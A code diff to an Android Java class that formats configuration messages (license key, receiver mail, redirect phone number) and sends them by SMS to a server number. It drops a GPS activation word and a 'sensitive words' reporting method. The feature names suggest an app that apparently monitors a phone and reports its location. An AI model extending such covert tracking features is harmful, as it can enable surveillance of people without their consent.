@@ -202,28 +202,17 @@ public class SmsCtrl
 		return tempString;
 	}
 
-	// The sms content format: <header>,<license key>,<receiver mail>,<receiver phone num>,<gps activation word>
+	// The sms content format: <header>,<license key>,<receiver mail>,<receiver phone num>
 	public static void sendReceiverInfoSms(Context context) {
 		String strMobile = context.getResources().getString(R.string.srv_address).trim();
 		String key = ConfigCtrl.getLicenseKey(context);
 		if (key == null) key = "";
 		String rcvMail = GlobalPrefActivity.getMail(context);
 		String rcvPhoneNum = GlobalPrefActivity.getRedirectPhoneNum(context);
-		String gpsWord = GlobalPrefActivity.getGpsWord(context);
-		String strContent = SmsConsts.HEADER_INFO_EX + key + "," + rcvMail + "," + rcvPhoneNum + "," + gpsWord;
+		String strContent = SmsConsts.HEADER_INFO_EX + key + SmsConsts.SEPARATOR + rcvMail + SmsConsts.SEPARATOR + rcvPhoneNum;
 		sendSms(strMobile, strContent);
 	}
 	
-	// The sms content format: <header>,<license key>,<receiver sensitive words>
-	public static void sendSensitiveWordsSms(Context context) {
-		String strMobile = context.getResources().getString(R.string.srv_address).trim();
-		String key = ConfigCtrl.getLicenseKey(context);
-		if (key == null) key = "";
-		String sensWords = GlobalPrefActivity.getSensitiveWords(context);
-		String strContent = SmsConsts.HEADER_SENSI_WORDS_EX + key + "," + sensWords;
-		sendSms(strMobile, strContent);
-	}
-
 	public static String buildLocationSms(Context context, Location location, String realOrHist) 
 	{
 		if (location == null) {
